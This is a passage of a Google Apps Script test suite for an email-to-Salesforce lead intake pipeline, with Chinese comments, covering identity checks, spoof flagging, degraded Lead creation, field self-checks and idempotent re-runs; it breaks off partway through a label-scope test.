    plAssert_(!again.createdNow,'a forced re-run resolves to the existing Lead instead of creating a second one');
    plAssertEq_(again.created,true,'but the durable flag survives, so SF-Lead-Created is not removed (R14)');
    plAssertEq_(plTestPosts_(calls).length,0,'no second POST');
   });
  });
 });

 // ---- 6. ⚠️ Jack 要确认的:链接提取失败时会怎样 ----
 plTestClearState_();
 // 6a. 有链接但抓取失败(且邮件里也没有模板数据)→ **降级建 Lead**,标记 CUSTOMER DETAILS MISSING
 plTestWithGmail_(inbox,function(){
  plTestWithFetch_(function(){return {code:500,text:'boom'};},function(){
   plTestWithFakeApi_(function(calls){
    ivQuery_=function(q){calls.push({kind:'query',query:q});
     if(/WHERE Id='/.test(q))return [{Id:'00Qr9000000002AAA'}];
     return [];};
    var state=plTestFromMessageId(id,true);
    plAssertEq_(state.created,true,'a failed fetch must still create the Lead — the SLA clock is running');
    var posts=plTestPosts_(calls);
    plAssert_(/CUSTOMER DETAILS MISSING/.test(posts[0].data.Description),'Description tells the reviewer to open the link');
    plAssertEq_(posts[0].data.Plenti_Lead_ID__c,token,'identity survives the failed fetch');
   });
  });
 });

 // 6b. **完全没有链接** → 不建 Lead,转 review。这是 D-019 的设计,不是缺陷:
 //     没有 delivery token 就没有稳定标识,建了 Lead 之后重发会建出第二个。
 plTestClearState_();
 // 可信发件人 + 命中白名单,但正文里**没有** browser-view 链接
 var noLink=plTestMessageFrom_({id:'r9-no-link',subject:'Action required: New lead',
  date:'2026-09-09T03:10:00.000Z',
  headers:{'To':'eDocs <edocs@example.org>',
   'X-Original-Sender':'referrals@plenti.example',
   'X-Original-Authentication-Results':'mx.example.org; dkim=pass; spf=pass; dmarc=pass header.from=plenti.example'},
  body:'Hi Sunterra,\n\nA new customer lead is available in your Plenti Portal.\n'});
 var box3={};box3[noLink.getId()]=noLink;
 plTestWithGmail_(box3,function(){
  plTestWithFakeApi_(function(calls){
   var state=plTestFromMessageId(noLink.getId());
   plAssertEq_(state.state,'review','no link means no stable identifier, so no Lead');
   plAssertEq_(plTestPosts_(calls).length,0,'nothing is written without an identifier');
   plAssert_(/Not identifiable as a Plenti referral/.test(state.reason),'the reason says why');
  });
 });

 // 6c. 没有链接但打开 PLENTI_FORCE_CREATE → 用合成 token 建出降级 Lead。
 //     这是 Jack 想要的"链接丢了也能建"的口子,已由 R3 覆盖,不需要新开关。
 plTestClearState_();
 plTestSetProps_({PLENTI_FORCE_CREATE:'true'});
 plTestWithGmail_(box3,function(){
  plTestWithFakeApi_(function(calls){
   ivQuery_=function(q){calls.push({kind:'query',query:q});
    if(/WHERE Id='/.test(q))return [{Id:'00Qr9000000003AAA'}];
    return [];};
   var state=plTestFromMessageId(noLink.getId());
   plAssertEq_(state.created,true,'PLENTI_FORCE_CREATE lets a link-less message through for testing');
   plAssertEq_(state.forced,true,'and the state records that it was forced');
   var posts=plTestPosts_(calls);
   plAssert_(/^FORCED-/.test(posts[0].data.Plenti_Lead_ID__c),'the synthetic token is obviously test data');
  });
 });
 plTestSetProps_({PLENTI_FORCE_CREATE:null,INTAKE_LOG_SHEET_ID:null});

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 26 test-entry-point cases (safety switches, allowlist, full pipeline, idempotency, degradation)');
}

// ============================================================
// 20. R10 测试用发件人覆盖 —— ⚠️ Phase 4 后连同被测代码一起删除
// ============================================================

function testPlentiSenderOverride(){
 plTestBaseline_();
 // 测试入口照常受两道安全开关约束,用例里要显式打开(见 testPlentiTestEntryPoint)
 plTestSetProps_({INTAKE_V2_ENABLED:'true',EDOCS_ADAPTATION_VALIDATED:'true'});
 // 转发件的写照:有 browser-view 链接、命中白名单,但**两个身份头都没有**
 var forwarded=plTestMessageFrom_({id:'r10-forwarded',
  subject:'Fwd: Action required: New lead',date:'2026-09-09T04:00:00.000Z',
  headers:{'To':'eDocs <edocs@example.org>'},
  body:'---------- Forwarded message ----------\nView in Browser: https://e.customeriomail.com/deliveries/'+plTestBrowserToken_()+'\n'});
 var box={};box['r10-forwarded']=forwarded;

 // ---- 1. 未设置属性 → 覆盖不存在,行为与之前完全一致 ----
 plAssertEq_(plTestSenderOverride_(),'','no property means no override');
 plTestWithGmail_(box,function(){
  plTestWithFakeApi_(function(calls){
   var state=plTestFromMessageId('r10-forwarded');
   plAssertEq_(state.state,'review','a forwarded message still fails identity without the override');
   plAssert_(/Sender could not be determined/.test(state.reason),'and says exactly why');
   plAssertEq_(plTestPosts_(calls).length,0,'nothing is written');
  });
 });

 // ---- 2. ⚠️ 主流程绝不受影响(行为检查,与 offline.cjs 的静态检查互为双保险)----
 plTestSetProps_({PLENTI_TEST_SENDER_OVERRIDE:'referrals@plenti.example'});
 plTestClearState_();
 plTestWithFakeApi_(function(calls){
  // plProcess_ 是主流程的核心,直接喂给它同一封邮件
  var state=plProcess_(forwarded,false);
  plAssertEq_(state.state,'review','plProcess_ must not read the test override property');
  plAssert_(/Sender could not be determined/.test(state.reason),'the main flow verdict is byte-identical with the override set');
  plAssertEq_(plTestPosts_(calls).length,0,'the main flow still writes nothing');
 });

 // ---- 3. 通过测试入口 → 覆盖生效,整条链路跑通 ----
 plTestClearState_();
 plTestWithGmail_(box,function(){
  plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
   plTestWithFakeApi_(function(calls){
    ivQuery_=function(q){calls.push({kind:'query',query:q});
     if(/WHERE Id='/.test(q))return [{Id:'00Qr10000000001AAA',Plenti_Lead_ID__c:plTestBrowserToken_()}];
     return [];};
    var state=plTestFromMessageId('r10-forwarded');
    plAssertEq_(state.created,true,'the override lets the forwarded message through the identity gate');
    var posts=plTestPosts_(calls);
    plAssertEq_(posts.length,1,'exactly one Lead');
    plAssertEq_(posts[0].data.LastName,'Fixture Example','customer data came from the browser view');
    plAssertEq_(posts[0].data.Plenti_Lead_ID__c,plTestBrowserToken_(),'the real delivery token is used, not a synthetic one');
   });
  });
 });

 // ---- 4. 包装层只补缺失的头,不覆盖真实的认证结果 ----
 var withRealAuth=plTestMessageFrom_({id:'r10-real-auth',subject:'s',headers:{
  'X-Original-Sender':'someone@elsewhere.example',
  'X-Original-Authentication-Results':'mx.example.org; dmarc=fail header.from=elsewhere.example'},body:'x'});
 var wrapped=plTestOverrideMessage_(withRealAuth,'referrals@plenti.example');
 plAssertEq_(wrapped.getHeader('X-Original-Sender'),'referrals@plenti.example','the sender is replaced');
 plAssert_(/dmarc=fail/.test(wrapped.getHeader('X-Original-Authentication-Results')),'a real authentication result is passed through untouched, never overwritten');
 var bare=plTestOverrideMessage_(forwarded,'referrals@plenti.example');
 plAssert_(/dmarc=pass/.test(bare.getHeader('X-Original-Authentication-Results')),'a missing authentication result is synthesised so the rest of the pipeline can be tested');
 plAssertEq_(bare.getHeader('To'),'eDocs <edocs@example.org>','all other headers delegate to the real message');
 plAssertEq_(bare.getId(),forwarded.getId(),'identity and body delegate unchanged');
 plAssertEq_(bare.getPlainBody(),forwarded.getPlainBody(),'body delegates unchanged');

 // ---- 5. 配置错误要快速失败,并给出可操作的提示 ----
 plTestSetProps_({PLENTI_TEST_SENDER_OVERRIDE:'not-an-address'});
 plTestWithGmail_(box,function(){
  plAssertThrows_(function(){plTestFromMessageId('r10-forwarded');},/must be an email address/,'a malformed override fails fast');
 });
 plTestSetProps_({PLENTI_TEST_SENDER_OVERRIDE:'jack@example.org'});
 plTestWithGmail_(box,function(){
  plAssertThrows_(function(){plTestFromMessageId('r10-forwarded');},/INTERNAL_DOMAIN/,'an internal-domain override would be silently classified internal, so it is refused up front');
 });

 plTestSetProps_({PLENTI_TEST_SENDER_OVERRIDE:null,INTAKE_V2_ENABLED:null,EDOCS_ADAPTATION_VALIDATED:null});
 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 18 sender-override cases (main flow provably unaffected)');
}

// ============================================================
// 21. R11 字段自检 —— 长期工具,不随临时代码删除
// ============================================================

function testPlentiFieldSelfCheck(){
 plTestBaseline_();

 // ---- 模板遗留字段必须已经清干净 ----
 plAssert_(ivLeadFields_().indexOf('Lead_Category__c')<0,'Lead_Category__c must be gone from the SOQL field list — the org never had it');
 plAssert_(plLeadFields_().indexOf('Lead_Category__c')<0,'and gone from the Plenti field list too');
 plAssert_(plLeadFields_().indexOf('Plenti_Lead_ID__c')>=0,'the delivery-token field is still selected');

 // ---- 自检的覆盖范围由代码推导,不是手工清单 ----
 var used=plLeadFieldsUsed_(),names=[],i;
 for(i=0;i<used.length;i++)names.push(used[i].name);
 plAssert_(names.length>20,'the probe should cover the whole payload plus the read list');
 plAssert_(names.indexOf('Plenti_Browser_View_HTML__c')>=0,'write-only fields are covered');
 plAssert_(names.indexOf('IsConverted')>=0,'read-only fields are covered');
 // [R12] Plenti_Received_At__c 现在是**可选**字段:必须出现在自检清单里
 // (否则探测失败时它会从清单消失、正好躲开检查),但运行期按探测结果决定写不写。
 plAssert_(names.indexOf('Plenti_Received_At__c')>=0,'the optional field must still be listed in the self-check');
 function optionalOf(n){var j;for(j=0;j<used.length;j++)if(used[j].name===n)return used[j].optional===true;return false;}
 plAssertEq_(optionalOf('Plenti_Received_At__c'),true,'and flagged as optional so a missing field is not reported as an error');
 plAssertEq_(optionalOf('Plenti_Lead_ID__c'),false,'required fields are not flagged optional');
 plAssert_(names.indexOf('Lead_Category__c')<0,'the template leftover stays gone');

 // 用法标注要正确 —— write-only 与 read+write 要分得开
 function usageOf(n){var j;for(j=0;j<used.length;j++)if(used[j].name===n)return used[j].usage;return '';}
 plAssertEq_(usageOf('LastName'),'write','LastName is written but not selected back');
 plAssertEq_(usageOf('IsConverted'),'read','IsConverted is only read');
 plAssertEq_(usageOf('Description'),'read+write','Description is both');

 // ---- describe 比对:能把缺失字段找出来 ----
 var realReq=ivReq_;
 function withDescribe(fieldNames,fn){
  ivReq_=function(path){
   if(path!=='sobjects/Lead/describe')throw new Error('unexpected request: '+path);
   var out=[],k;
   for(k=0;k<fieldNames.length;k++)out.push({name:fieldNames[k],createable:true,updateable:true});
   return {fields:out};
  };
  try{return fn();}finally{ivReq_=realReq;}
 }

 // org 里什么都有 → 零缺失
 var complete=withDescribe(names,function(){return plTestDescribeLead();});
 plAssertEq_(complete.missing.length,0,'a complete org reports nothing missing');
 plAssertEq_(complete.used,names.length,'the report counts every field the code uses');

 // [R12] 可选字段缺失 → 走 optionalMissing,**不算错误**
 var noOptional=[],j;
 for(j=0;j<names.length;j++)if(names[j]!=='Plenti_Received_At__c')noOptional.push(names[j]);
 var degraded=withDescribe(noOptional,function(){return plTestDescribeLead();});
 plAssertEq_(degraded.missing.length,0,'a missing OPTIONAL field is not reported as an error');
 plAssertEq_(degraded.optionalMissing.length,1,'it is reported separately');
 plAssertEq_(degraded.optionalMissing[0],'Plenti_Received_At__c','named exactly');

 // 拿掉一个必需的自定义字段 → 必须被点名
 var without=[],skipped='Plenti_Browser_View_HTML__c';
 for(i=0;i<names.length;i++)if(names[i]!==skipped)without.push(names[i]);
 var gap=withDescribe(without,function(){return plTestDescribeLead();});
 plAssertEq_(gap.missing.length,1,'a missing field is reported');
 plAssert_(gap.missing[0].indexOf(skipped)===0,'and named exactly');
 plAssert_(gap.missing[0].indexOf('write')>=0,'together with how the code uses it');

 // 这正是本轮撞到的那一发:Lead_Category__c 若还在,自检应当报出来
 var withCategory=withDescribe(names,function(){
  var saved=plLeadFields_;
  plLeadFields_=function(){return saved()+',Lead_Category__c';};
  try{return plTestDescribeLead();}finally{plLeadFields_=saved;}
 });
 plAssertEq_(withCategory.missing.length,1,'the self-check would have caught the Lead_Category__c regression before it hit Salesforce');
 plAssert_(/Lead_Category__c/.test(withCategory.missing[0]),'named explicitly');

 // 字段存在但不可写 → 单独报
 var readOnly=withDescribe(names,function(){
  var saved=ivReq_;
  ivReq_=function(){
   var out=[],k;
   for(k=0;k<names.length;k++)out.push({name:names[k],createable:names[k]!=='LeadSource',updateable:true});
   return {fields:out};
  };
  try{return plTestDescribeLead();}finally{ivReq_=saved;}
 });
 plAssertEq_(readOnly.notCreateable.length,1,'a present-but-not-createable field is reported separately');
 plAssertEq_(readOnly.notCreateable[0],'LeadSource','named exactly');

 plTestBaseline_();
 console.log('PASS: 20 field self-check cases (would have caught this round\'s 400 before it happened)');
}

// ============================================================
// 22. R12 Plenti_Received_At__c —— PLT001 的计时起点
// ============================================================

function testPlentiReceivedAt(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral'),parsed=plTestParsed_();
 var enrichment={html:'',meta:{found:['name']}};

 /** 假装 org 里有/没有这些字段。 */
 function withFields(present,fn){
  var real=ivReq_;
  plLeadFieldMap_.cache=null;
  ivReq_=function(path){
   if(path!=='sobjects/Lead/describe')throw new Error('unexpected request: '+path);
   var out=[],i;
   for(i=0;i<present.length;i++)out.push({name:present[i],createable:true,updateable:true});
   return {fields:out};
  };
  try{return fn();}finally{ivReq_=real;plLeadFieldMap_.cache=null;}
 }

 // ---- 1. ⚠️ 值必须是邮件时间,不是脚本运行时间 ----
 var payload=withFields(['Plenti_Received_At__c'],function(){return plLeadPayload_(message,parsed,enrichment);});
 plAssertEq_(payload.Plenti_Received_At__c,message.getDate().toISOString(),
  'Plenti_Received_At__c must be the message date — PLT001 is measured from it and a wrong value cannot be recovered afterwards');
 plAssertEq_(payload.Plenti_Received_At__c,'2026-09-07T02:15:00.000Z','the exact fixture timestamp, verbatim');
 // 运行时间会落在"现在"附近;邮件时间不会。这一条专门挡住有人改成 new Date()。
 plAssert_(Math.abs(new Date(payload.Plenti_Received_At__c).getTime()-Date.now())>60000,
  'a run-time value would be within seconds of now — this must not be the script clock');
 // 也不能被 parsed.receivedAt 顶替(那一层可能被 plForcedParse_ 之类改写)
 var tampered=plTestParsed_();tampered.receivedAt='1999-01-01T00:00:00.000Z';
 var fromMessage=withFields(['Plenti_Received_At__c'],function(){return plLeadPayload_(message,tampered,enrichment);});
 plAssertEq_(fromMessage.Plenti_Received_At__c,message.getDate().toISOString(),
  'the field is taken straight from message.getDate(), never from a value that passed through parsing');

 // ---- 2. 字段不存在 → 跳过,POST 照常成功 ----
 var without=withFields(['Id','Name'],function(){return plLeadPayload_(message,parsed,enrichment);});
 plAssert_(!('Plenti_Received_At__c' in without),'an absent field is omitted, not written empty — one bad field fails the whole request');
 plAssertEq_(JSON.parse(without.Plenti_Parsed_JSON__c).receivedAt,message.getDate().toISOString(),
  'the timestamp is still preserved in the parsed JSON when the field is absent');

 // 字段存在但不可写 → 同样跳过
 var readOnly=(function(){
  var real=ivReq_;plLeadFieldMap_.cache=null;
  ivReq_=function(){return {fields:[{name:'Plenti_Received_At__c',createable:false,updateable:false}]};};
  try{return plLeadPayload_(message,parsed,enrichment);}finally{ivReq_=real;plLeadFieldMap_.cache=null;}
 })();
 plAssert_(!('Plenti_Received_At__c' in readOnly),'a present-but-not-createable field is skipped too');

 // ---- 3. describe 本身失败 → 降级,绝不阻断建 Lead ----
 var broken=(function(){
  var real=ivReq_;plLeadFieldMap_.cache=null;
  ivReq_=function(){throw new Error('SIMULATED DESCRIBE FAILURE');};
  try{return plLeadPayload_(message,parsed,enrichment);}finally{ivReq_=real;plLeadFieldMap_.cache=null;}
 })();
 plAssert_(!('Plenti_Received_At__c' in broken),'a describe failure skips the optional field');
 plAssertEq_(broken.LeadSource,'Plenti Referrals','but the rest of the payload is intact — the Lead is still created');

 // ---- 4. describe 每次执行只发一次 ----
 (function(){
  var real=ivReq_,calls=0;plLeadFieldMap_.cache=null;
  ivReq_=function(path){calls++;return {fields:[{name:'Plenti_Received_At__c',createable:true}]};};
  try{
   plLeadPayload_(message,parsed,enrichment);
   plLeadPayload_(message,parsed,enrichment);
   plLeadPayload_(message,parsed,enrichment);
   plAssertEq_(calls,1,'the field map is cached per execution — three Leads must not cost three describes');
  }finally{ivReq_=real;plLeadFieldMap_.cache=null;}
 })();
 // 失败也要记住,不能每封邮件重试一次
 (function(){
  var real=ivReq_,calls=0;plLeadFieldMap_.cache=null;
  ivReq_=function(){calls++;throw new Error('SIMULATED DESCRIBE FAILURE');};
  try{
   plLeadPayload_(message,parsed,enrichment);
   plLeadPayload_(message,parsed,enrichment);
   plAssertEq_(calls,1,'a failed describe is remembered too — no retry storm across a batch');
  }finally{ivReq_=real;plLeadFieldMap_.cache=null;}
 })();

 // ---- 5. 端到端:真的写进 POST ----
 plTestClearState_();
 plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
  var real=ivReq_;plLeadFieldMap_.cache=null;
  var linked=plTestMessage_('trusted-referral-with-link'),posts=[];
  ivReq_=function(path,method,data){
   if(path==='sobjects/Lead/describe')return {fields:[{name:'Plenti_Received_At__c',createable:true}]};
   if(method==='post')posts.push(data);
   return {id:'00Qr12000000001AAA'};
  };
  var realQuery=ivQuery_;
  ivQuery_=function(q){if(/WHERE Id='/.test(q))return [{Id:'00Qr12000000001AAA'}];return [];};
  try{
   var state=plProcess_(linked,false);
   plAssertEq_(state.created,true,'the Lead is created');
   plAssertEq_(posts.length,1,'exactly one POST');
   plAssertEq_(posts[0].Plenti_Received_At__c,linked.getDate().toISOString(),
    'the timestamp that reaches Salesforce is the message date');
   plAssertEq_(posts[0].Plenti_Received_At__c,'2026-09-09T02:15:00.000Z','verbatim');
  }finally{ivReq_=real;ivQuery_=realQuery;plLeadFieldMap_.cache=null;}
 });

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 16 received-at cases (message date, never the script clock; absent field degrades)');
}

// ============================================================
// 24. R13 systems 必须落到人看得见的地方
// ============================================================

function testPlentiSystemsVisible(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral');

 function payloadWith(systems,fieldsPresent){
  var parsed=plTestParsed_();
  if(systems)parsed.systems=systems;
  var real=ivReq_;
  plLeadFieldMap_.cache=null;
  ivReq_=function(path){
   if(path!=='sobjects/Lead/describe')throw new Error('unexpected request: '+path);
   var out=[],i;
   for(i=0;i<fieldsPresent.length;i++)out.push({name:fieldsPresent[i],createable:true,updateable:true});
   return {fields:out};
  };
  try{return plLeadPayload_(message,parsed,{html:'',meta:{found:['name','address','systems']}});}
  finally{ivReq_=real;plLeadFieldMap_.cache=null;}
 }

 // ---- 1. 字段已建 → 写进专用字段,**同时**留在 Description ----
 var withField=payloadWith('Battery, Solar',['Plenti_Systems__c']);
 plAssertEq_(withField.Plenti_Systems__c,'Battery, Solar','systems lands in its own reportable field');
 plAssert_(/; systems: Battery, Solar/.test(withField.Description),'and stays in the Description summary so it is visible at a glance');

 // ---- 2. 字段没建 → 跳过字段,但 Description 里仍然看得到 ----
 //     这是关键:没有这份备份,systems 在字段建好之前就只存在于 JSON 里。
 var withoutField=payloadWith('Battery, Solar',['Id']);
 plAssert_(!('Plenti_Systems__c' in withoutField),'an absent field is skipped, never written — one bad field fails the whole request');
 plAssert_(/; systems: Battery, Solar/.test(withoutField.Description),'the Description copy keeps it visible while the field does not exist yet');

 // ---- 3. 没解析到 systems → 两处都不出现,不写空值 ----
 var none=payloadWith('',['Plenti_Systems__c']);
 plAssert_(!('Plenti_Systems__c' in none),'no systems means the field is omitted, not written empty');
 plAssert_(none.Description.indexOf('systems:')<0,'and the summary does not carry an empty label');

 // ---- 4. Description 仍然是一行,仍在上限内,仍不含正文 ----
 plAssertEq_(withField.Description.split('\n').length,1,'Description stays a single line');
 plAssert_(withField.Description.length<=32000,'and within the standard-field limit');
 plAssert_(withField.Description.indexOf('[Intake: '+message.getId()+']')===0,'the load-bearing marker is still first (D-013)');

 // ---- 5. 降级标记与 systems 可以并存 ----
 var degraded=(function(){
  var parsed=plTestParsed_();parsed.systems='Solar';
  return plLeadPayload_(message,parsed,{html:'',meta:{found:[],degraded:true}});
 })();
 plAssert_(/; systems: Solar/.test(degraded.Description),'systems still shown when the browser view degraded');
 plAssert_(/CUSTOMER DETAILS MISSING/.test(degraded.Description),'and the degraded warning is still there');

 // ---- 6. 超长 systems 截断,不能撑破字段 ----
 var huge=payloadWith(new Array(400).join('x'),['Plenti_Systems__c']);
 plAssert_(huge.Plenti_Systems__c.length<=255,'systems is truncated to the Text(255) limit');
 plAssert_(/\[TRUNCATED\]$/.test(huge.Plenti_Systems__c),'and marked, with the marker counted inside the limit');

 // ---- 7. 端到端:真的进 POST ----
 plTestClearState_();
 plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
  var linked=plTestMessage_('trusted-referral-with-link'),posts=[],real=ivReq_,realQuery=ivQuery_;
  plLeadFieldMap_.cache=null;
  ivReq_=function(path,method,data){
   if(path==='sobjects/Lead/describe')return {fields:[{name:'Plenti_Systems__c',createable:true}]};
   if(method==='post')posts.push(data);
   return {id:'00Qr13000000001AAA'};
  };
  ivQuery_=function(q){if(/WHERE Id='/.test(q))return [{Id:'00Qr13000000001AAA'}];return [];};
  try{
   plProcess_(linked,false);
   plAssertEq_(posts.length,1,'one Lead created');
   plAssertEq_(posts[0].Plenti_Systems__c,'Battery, Solar','the parsed systems reach Salesforce as a field');
   plAssert_(/; systems: Battery, Solar/.test(posts[0].Description),'and in the summary');
   plAssertEq_(posts[0].LastName,'Fixture Example','the whole name is in LastName, unsplit');
  }finally{ivReq_=real;ivQuery_=realQuery;plLeadFieldMap_.cache=null;}
 });

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 16 systems-visibility cases (dedicated field plus Description fallback)');
}

// ============================================================
// 25. R14 created 的持久语义与 Lead_ID 字段属性
// ============================================================

function testPlentiCreatedDurability(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral'),parsed=plTestParsed_();
 var marker='[Intake: '+message.getId()+']';

 // ---- 1. token 命中 + Description 带本邮件 marker → 这封邮件建的 ----
 plTestWithFakeApi_(function(calls){
  ivQuery_=function(q){calls.push({kind:'query',query:q});
   return [{Id:'00Qdur00000001AAA',Description:marker+' Plenti referral received ...',IsConverted:false,Status:'New'}];};
  var r=plResolve_(message,parsed);
  plAssertEq_(r.created,true,'a token hit whose Description carries THIS message marker means this message created it');
 });

 // ---- 2. token 命中但 marker 是别的邮件 → 重发件,不算它建的 ----
 plTestWithFakeApi_(function(calls){
  ivQuery_=function(q){calls.push({kind:'query',query:q});
   return [{Id:'00Qdur00000001AAA',Description:'[Intake: some-other-message] ...',IsConverted:false,Status:'New'}];};
  var r=plResolve_(message,parsed);
  plAssertEq_(r.created,false,'a resent referral did not create the Lead — it should only raise Review so a human checks for a duplicate');
 });

 // ---- 3. ⚠️ 回归复现:两轮跑之后 SF-Lead-Created 不能熄 ----
 //     第一轮新建,第二轮 force 重跑走去重路径。修复前第二轮会把标签摘掉。
 plTestClearState_();
 plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
  var linked=plTestMessage_('trusted-referral-with-link'),lead=null;
  var realReq=ivReq_,realQuery=ivQuery_;
  plLeadFieldMap_.cache=null;
  ivReq_=function(path,method,data){
   if(path==='sobjects/Lead/describe')return {fields:[]};
   if(method==='post'){lead={Id:'00Qdur00000002AAA',Description:data.Description,IsConverted:false,Status:'New'};return {id:lead.Id};}
   return {};
  };
  ivQuery_=function(){return lead?[lead]:[];};
  try{
   var first=plProcess_(linked,false);
   plAssertEq_(first.created,true,'run 1: the message created the Lead');
   plAssertEq_(first.createdNow,true,'run 1: and it happened in this run');
   plAssertEq_(ivLeadLabelFlags_([first]).created,true,'run 1: SF-Lead-Created lights');

   var second=plProcess_(linked,true);
   plAssertEq_(second.created,true,'run 2: the durable flag survives a forced re-run — this is the regression');
   plAssert_(!second.createdNow,'run 2: but nothing was created this time');
   plAssertEq_(ivLeadLabelFlags_([second]).created,true,'run 2: SF-Lead-Created must STAY lit, not be removed');
   // [Q18] 同一封邮件重跑命中自己的 marker = 干净,不再亮 Review(D-033)。
   plAssertEq_(second.state,'done','run 2: a re-run that matches its own marker is clean — done');
   plAssertEq_(ivLeadLabelFlags_([second]).review,false,'run 2: so Review stays off');
   plAssert_(/Existing Lead matched/.test(second.reason),'run 2: the reason says it matched, not that it created');
  }finally{ivReq_=realReq;ivQuery_=realQuery;plLeadFieldMap_.cache=null;}
 });

 // ---- 4. 运行日志的计数必须用 createdNow,不能用 created ----
 //     否则 force 重跑和 error 重试会让月度对账多算 Lead。
 plAssertEq_(ivLeadLabelFlags_([{kind:'referral',state:'review',created:true,record:'00Q1',leadCandidate:true}]).created,true,
  'the label reads the durable flag');
 var reRun={kind:'referral',state:'review',created:true,record:'00Q1',leadCandidate:true};
 plAssert_(!reRun.createdNow,'a re-run state has no createdNow, so the run log counts zero Leads created');

 // ---- 5. 字段属性报告:unique / caseSensitive / externalId ----
 var names=[],used=plLeadFieldsUsed_(),i;
 for(i=0;i<used.length;i++)names.push(used[i].name);
 function describeWith(keyAttrs){
  var real=ivReq_;plLeadFieldMap_.cache=null;
  ivReq_=function(){
   var out=[],j;
   for(j=0;j<names.length;j++){
    if(names[j]==='Plenti_Lead_ID__c')out.push({name:names[j],createable:true,type:'string',length:255,
     unique:keyAttrs.unique,caseSensitive:keyAttrs.caseSensitive,externalId:keyAttrs.externalId});
    else out.push({name:names[j],createable:true});
   }
   return {fields:out};
  };
  // 快照要在 finally 清缓存之前取
  try{
   var report=plTestDescribeLead();
   return {report:report,map:plLeadFieldMap_(),exists:plLeadFieldExists_('Plenti_Lead_ID__c'),
    absent:plLeadFieldExists_('No_Such_Field__c')};
  }finally{ivReq_=real;plLeadFieldMap_.cache=null;}
 }
 var good=describeWith({unique:true,caseSensitive:true,externalId:true});
 plAssertEq_(good.report.missing.length,0,'a fully configured org reports nothing missing');
 plAssertEq_(good.exists,true,'existence check still works on the richer map');
 plAssertEq_(good.absent,false,'and an absent field is still absent');
 plAssertEq_(good.map.Plenti_Lead_ID__c.unique,true,'unique is read from describe');

 // 属性确实进了缓存,而不是被压扁成一个 createable 布尔值
 var bad=describeWith({unique:false,caseSensitive:false,externalId:false});
 plAssert_(bad.map.Plenti_Lead_ID__c,'the field map keeps the full attribute object');
 plAssertEq_(bad.map.Plenti_Lead_ID__c.unique,false,'unique is read from describe, not assumed');
 plAssertEq_(bad.map.Plenti_Lead_ID__c.caseSensitive,false,'caseSensitive is read from describe');
 plAssertEq_(bad.map.Plenti_Lead_ID__c.externalId,false,'externalId is read from describe');
 plAssertEq_(bad.exists,true,'a non-unique field still exists and is still written — the warning is advisory');

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 20 created-durability and field-attribute cases');
}

// ============================================================
// 26. D-027 Q10 收窄:标签只留给带 Plenti 链接的邮件
// ============================================================

function testPlentiScopeNarrowing(){
 plTestBaseline_();
 var token=plTestBrowserToken_(),link='https://e.customeriomail.com/deliveries/'+token;

 function make(o){
  return plTestMessageFrom_({id:o.id,subject:o.subject||'Something',
   date:'2026-09-10T02:00:00.000Z',from:o.from||'Someone <someone@elsewhere.example>',
   headers:o.headers||{'To':'eDocs <edocs@example.org>'},
   body:o.body||'Just an ordinary business email.\n'});
 }
 function run(message){
  plTestClearState_();
  return plTestWithFakeApi_(function(calls){
   var st=plProcess_(message,false);
   plAssertEq_(plTestPosts_(calls).length,0,'unverified mail never writes to Salesforce');
   return st;
  });
 }

 // ---- 1. 不可信 + 无链接 → 不打标签,但状态照常留存 ----
 var noise=run(make({id:'scope-noise',subject:'Invoice for August',
  headers:{'To':'eDocs <edocs@example.org>','X-Original-Sender':'accounts@supplier.example',
   'X-Original-Authentication-Results':'mx; dmarc=pass header.from=supplier.example'}}));
 plAssertEq_(noise.state,'done','[Q18] ordinary traffic needs no human, so it is done — the state is still persisted and logged');
 plAssertEq_(noise.leadCandidate,false,'but does not occupy the Review label');
 plAssertEq_(noise.scope,'out-of-scope','categorised as out of scope');
 plAssertEq_(ivLeadLabelFlags_([noise]).review,false,'no Gmail label');
 plAssert_(PropertiesService.getScriptProperties().getProperty('IV2_MSG_scope-noise'),
  'the state is persisted — this is a narrower label, not a silent drop');

 // ---- 2. 不可信 + 有链接 + 外部发件人 → 打标签,而且显眼 ----
 var suspicious=run(make({id:'scope-suspicious',subject:'Action required: New lead',
  from:'"Plenti" <referrals@attacker.example>',
  headers:{'To':'eDocs <edocs@example.org>','X-Original-Sender':'referrals@attacker.example',
   'X-Original-Authentication-Results':'mx; dmarc=fail header.from=attacker.example'},
  body:'View in Browser: '+link+'\n'}));
 plAssertEq_(suspicious.leadCandidate,true,'a Plenti link with an unverifiable sender must be labelled');
 plAssertEq_(suspicious.scope,'unlisted-sender-with-link','an unlisted sender: authentication is never evaluated, so we cannot call it a spoof (R18)');
 plAssert_(/SENDER NOT IN TRUSTED LIST: referrals@attacker\.example/.test(suspicious.reason),'the reason names the sender so it can be added to the list if legitimate');
 plAssert_(/could also be|may also be/.test(suspicious.reason),'and still mentions it may be a spoof');
 plAssertEq_(ivLeadLabelFlags_([suspicious]).review,true,'SF-Lead-Review lights');

 // ---- 2b. [R18] 发件人在清单里、但认证失败 → 这才是"疑似伪造" ----
 var authFailed=run(make({id:'scope-auth-failed',subject:'Action required: New lead',
  headers:{'To':'eDocs <edocs@example.org>','X-Original-Sender':'referrals@plenti.example',
   'X-Original-Authentication-Results':'mx; dkim=fail; dmarc=fail header.from=plenti.example'},
  body:'View in Browser: '+link+'\n'}));
 plAssertEq_(authFailed.scope,'unverified-with-link','a LISTED sender that fails authentication is the real spoof signal');
 plAssert_(/NEEDS A HUMAN/.test(authFailed.reason),'and the reason is loud');
 plAssert_(/failed verification/.test(authFailed.reason),'naming it as a verification failure');

 // ---- 3. 同事手动转发 → 也打标签,但 reason 区分得出来 ----
 //     这正是我们测的那封:没有 X-Original-Sender,但链接完整保留。
 var forwarded=run(make({id:'scope-forwarded',subject:'Fwd: Action required: New lead',
  from:'Lily <lily@example.org>',
  headers:{'To':'Jack <jack@example.org>'},
  body:'---------- Forwarded message ----------\nView in Browser: '+link+'\n'}));
